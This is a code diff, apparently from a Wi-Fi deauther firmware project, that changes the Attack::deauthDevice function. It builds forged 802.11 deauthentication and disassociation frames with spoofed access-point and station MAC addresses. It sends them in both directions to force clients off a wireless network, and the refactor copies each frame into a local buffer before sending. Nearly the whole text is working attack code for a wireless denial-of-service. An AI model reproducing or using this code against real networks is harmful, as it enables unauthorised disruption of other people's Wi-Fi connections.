@@ -285,23 +285,31 @@ bool Attack::deauthDevice(uint8_t* apMac, uint8_t* stMac, uint8_t reason, uint8_
 
     // build deauth packet
     packetSize = sizeof(deauthPacket);
-    memcpy(&deauthPacket[4], stMac, 6);
-    memcpy(&deauthPacket[10], apMac, 6);
-    memcpy(&deauthPacket[16], apMac, 6);
-    deauthPacket[24] = reason;
+    
+    uint8_t deauthpkt[packetSize];
+
+    memcpy(deauthpkt, deauthPacket, packetSize);
+    
+    memcpy(&deauthpkt[4], stMac, 6);
+    memcpy(&deauthpkt[10], apMac, 6);
+    memcpy(&deauthpkt[16], apMac, 6);
+    deauthpkt[24] = reason;
 
     // send deauth frame
-    deauthPacket[0] = 0xc0;
+    deauthpkt[0] = 0xc0;
 
-    if (sendPacket(deauthPacket, packetSize, ch, 1)) {
+    if (sendPacket(deauthpkt, packetSize, ch, 1)) {
         success = true;
         deauth.packetCounter++;
     }
 
     // send disassociate frame
-    deauthPacket[0] = 0xa0;
+    uint8_t disassocpkt[packetSize];
+    memcpy(disassocpkt, deauthpkt, packetSize);
+    
+    disassocpkt[0] = 0xa0;
 
-    if (sendPacket(deauthPacket, packetSize, ch, 1)) {
+    if (sendPacket(disassocpkt, packetSize, ch, 1)) {
         success = true;
         deauth.packetCounter++;
     }
@@ -309,22 +317,22 @@ bool Attack::deauthDevice(uint8_t* apMac, uint8_t* stMac, uint8_t reason, uint8_
     // send another packet, this time from the station to the accesspoint
     if (!macBroadcast(stMac)) { // but only if the packet isn't a broadcast
         // build deauth packet
-        memcpy(&deauthPacket[4], apMac, 6);
-        memcpy(&deauthPacket[10], stMac, 6);
-        memcpy(&deauthPacket[16], stMac, 6);
+        memcpy(&disassocpkt[4], apMac, 6);
+        memcpy(&disassocpkt[10], stMac, 6);
+        memcpy(&disassocpkt[16], stMac, 6);
 
         // send deauth frame
-        deauthPacket[0] = 0xc0;
+        disassocpkt[0] = 0xc0;
 
-        if (sendPacket(deauthPacket, packetSize, ch, 1)) {
+        if (sendPacket(disassocpkt, packetSize, ch, 1)) {
             success = true;
             deauth.packetCounter++;
         }
 
         // send disassociate frame
-        deauthPacket[0] = 0xa0;
+        disassocpkt[0] = 0xa0;
 
-        if (sendPacket(deauthPacket, packetSize, ch, 1)) {
+        if (sendPacket(disassocpkt, packetSize, ch, 1)) {
             success = true;
             deauth.packetCounter++;
         }
